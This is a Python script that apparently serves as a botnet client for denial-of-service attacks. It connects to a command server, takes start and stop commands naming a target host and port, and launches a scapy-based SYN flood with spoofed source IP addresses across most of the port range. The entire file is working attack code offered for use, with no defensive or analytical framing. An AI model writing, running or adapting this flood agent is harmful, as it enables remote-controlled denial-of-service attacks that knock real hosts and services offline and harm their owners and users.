#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import socket
import random
import argparse
from multiprocessing import Process
from scapy.all import *
import os

is_working = False
cur_process = None

# SYN flood attck
def syn_flood(tgt, d_port):
    print("="*100)
    print("The syn flood is running!")
    print("="*100)
    src_list = ['201.1.1.2', '10.1.1.102','69.1.1.2','125.130.5.199']
    for s_port in range(1024, 65535):
        index = random.randrange(4)
        ip_layer = IP(src=src_list[index], dst=tgt)
        tcp_layer = TCP(sport=s_port, dport=d_port,flags="S")
        packet = ip_layer / tcp_layer
        scapy.all.send(packet)

# command type '#-H xxx.xxx.xxx.xxx -p xxxx -c <start>'
# deal command
def cmd_handle(sock, parser):
    global cur_process
    while True:
        # receive command
        data = sock.recv(1024).decode('utf-8')
        if len(data) == 0:
            print('The data is empty')
            return
        if data[0] == '#':
            try:
                # parse command
                options = parser.parse_args(data[1:].split())
                m_host = options.host
                m_port = options.port
                m_cmd = options.cmd

                # ddos start command
                if m_cmd.lower() == 'start':
                    if cur_process != None and cur_process.is_alive():
                        cur_process.terminate()
                        cur_process = None
                        os.system('clear')
                    print('The syn_flood is start')
                    p = Process(target=syn_flood, args=(m_host, m_port))
                    p.start()
                    cur_process = p
                # ddos end command
                elif m_cmd.lower() == 'stop':
                    if cur_process.is_alive():
                        cur_process.terminate()
                        os.system('clear')
            except:
                print('Failed to perform the command!')

def main():
    # add need parse command
    p = argparse.ArgumentParser()
    p.add_argument('-H', dest='host', type=str)
    p.add_argument('-p', dest='port', type=int)
    p.add_argument('-c', dest='cmd', type=str)
    print('*'*40)
    try:
        # create socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect to server
        s.connect(('127.0.0.1',58868))
        print("To connected server was success!")
        print("="*40)
        # handle command
        cmd_handle(s, p)
    except:
        print("The network connected failed!")
        print("Please restart the script!")
        sys.exit()


if __name__ == "__main__":
    main()

